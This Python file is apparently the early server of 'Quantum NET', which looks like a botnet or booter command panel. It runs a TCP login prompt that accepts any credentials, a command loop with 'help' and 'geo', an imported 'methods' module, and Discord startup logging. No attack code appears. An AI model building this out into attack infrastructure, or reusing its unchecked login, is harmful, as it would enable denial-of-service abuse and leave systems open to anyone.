#
#
#@title: Quantum NET
#@since: 5/18/21
#@creator: Quantum Security Team (vl0b, Exo, clever, Max)
#
#

## Modules
import socket, sys, os, requests, time, threading, requests, random, datetime

## Files
from assets.Config.main import *
from assets.Config.current import *
from assets.Logger.discord import *
from assets.banner_system.modify import *
from assets.utils.main import utils

## Commands
from assets.Commands.help import *
from assets.Commands.methods import *
from assets.Commands.geo import *

if utils.CheckForPython3Unix() == True:
        print("Thanks for using python3!")
else:
        print("Must use Python3!\r\nUsage: python3 " + sys.argv[0])


buffer_length = 1024
host = "0.0.0.0" #requests.get("https://api.ipify.org").text
port = random.randint(0, 65535)
timenow = datetime.datetime.now() # current time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Try To Reuse Port Bypass TIME_WAIT Sometimes
sock.bind((host, port))
sock.listen()

print(f"Quantum Started | {host} | {port}")
DiscordFunc.netStartUp(host, port, timenow)

def handle_connection(client, addr):
        Current.CurrentInfo["IP"] = addr[0]

        # recData = client.recv(buffer_length).decode().split(":")
        # print(len(recData))
        # if len(recData) <= 1:
        #         client.send("Failed to connect!".encode())
        #         print(Strings.MainColors["Red"] + "Connection closed, by " + addr[0] + ":" + str(addr[1]) + ""+ Strings.MainColors["Reset"])
        #         client.close()
        #         return
        # username = recData[0]
        # password = recData[1]
        
        # client.send("1".encode())

        client.send("Username: ".encode())
        username = client.recv(1024).decode()
        client.recv(1024).decode()
        client.send("Password: ".encode())
        password = client.recv(1024).decode()

        client.send(f"{username} | {password}\r\n".encode())
        client.send("Welcome to Quantum Net\r\n".encode())

        while(True):
                client.send(Strings.hostname(username).encode())
                data = str(client.recv(buffer_length).decode()).strip().replace("\r\n", "")

                ## Command Handling
                if data != "\r\n":
                        Current.CurrentCmd["args"] = data.split(" ")
                        Current.CurrentCmd["fullcmd"] = data
                
                if data.lower() == "help":
                        help_command(client)
                elif data.lower().startswith("geo"):
                        geo_command(client, username)
        

def listener():
    while True:
        client, address = sock.accept()
        threading.Thread(target=handle_connection, args=(client,address)).start()
        print(Strings.MainColors['Red'] + "TCP Connection From " + address[0] + ":" + str(address[1]) + Strings.MainColors['Reset'])
threading.Thread(target=listener).start()

def Input(socket):
        socket.recv(1024)
        data = socket.recv(1024).decode("utf-8").strip().replace("\r\n", "")
        print(data)
        if data == r'b\'\'': return
        return data